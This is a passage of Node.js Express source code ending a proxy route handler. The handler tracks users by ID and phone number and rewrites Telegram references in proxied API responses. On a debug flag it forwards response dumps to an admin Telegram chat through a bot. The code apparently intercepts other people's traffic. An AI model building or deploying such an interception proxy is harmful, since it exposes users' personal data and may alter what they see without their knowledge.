🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) {
      trackUser(data, detectedUserId, path.split('?')[0].split('/').pop() || 'API', reqPhone);
    }
    replaceTelegramInObj(jsonResp, 0);
    if (debugNextResponse && data.adminChatId && bot) {
      debugNextResponse = false;
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 DEBUG:\n${req.method} ${path}\n${dump}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('proxy error:', path, e.message);
    if (!res.headersSent) {
      try { await transparentProxy(req, res); } catch(e2) {
        if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
      }
    }
  }
});

module.exports = app;